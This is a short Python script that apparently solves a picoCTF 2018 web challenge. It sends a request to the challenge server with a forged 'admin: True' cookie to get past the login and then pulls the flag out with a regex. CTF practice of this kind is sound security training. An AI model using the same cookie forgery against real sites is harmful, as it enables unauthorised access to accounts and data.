#!/usr/bin/python

import requests
import re

params = {'user': 'A', 'password': 'A', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('http://2018shell.picoctf.com:6153/flag', data=params, cookies=jar)
source = r.text
print re.findall(r'(picoCTF\{.+\})', source)[0]
